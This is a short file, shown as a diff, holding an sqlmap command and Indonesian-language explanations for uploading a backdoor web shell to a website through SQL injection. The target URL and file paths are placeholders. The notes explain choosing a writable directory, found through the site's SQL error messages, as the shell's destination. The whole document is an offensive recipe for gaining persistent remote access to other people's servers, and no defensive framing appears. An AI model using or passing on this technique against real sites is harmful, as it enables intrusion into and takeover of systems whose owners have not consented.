@@ -1,0 +1,5 @@
+sqlmap.py -u "http://urltarget.com/file.php?id=22" --dbs --file-write="path backdoor" --file-dest="path error sql and name backdoor" --batch
+
+Penjelasan :
+--file-write="path-backdoor" // Dimana kalian menyimpan path backdoor kalian.
+--file-dest="path error sql and name backdoor" // Kalian memilih path yang writable untuk mengupload shell, kalian bisa memanfaatkan syntax error pada website untuk mengetahuinya.
